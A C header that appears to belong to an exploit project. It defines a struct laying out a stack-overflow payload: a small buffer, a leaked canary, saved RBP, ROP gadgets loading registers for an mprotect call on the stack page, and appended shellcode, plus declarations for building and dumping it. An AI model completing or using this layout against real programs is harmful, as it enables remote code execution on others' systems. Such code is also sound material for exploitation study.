#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_

#include "addresses.h"
#include "shellcode.h"

typedef struct Payload {
	char		pl_dst[8];
	AddressUnion	pl_canary;
	AddressUnion	pl_rbp;
	AddressUnion	pl_popRDI;
	AddressUnion	pl_stackPage;
	AddressUnion	pl_popRSI;
	ptrdiff_t	pl_stackSize;
	AddressUnion	pl_popRDX;
	long		pl_permission;
	AddressUnion	pl_mprotect;
	AddressUnion	pl_shellCode;
	ShellCodeUnion	pl_scu;
} Payload, *PayloadPtr;

extern void	initload(PayloadPtr plp);
extern ssize_t	makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np);
extern void	dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr);
#endif
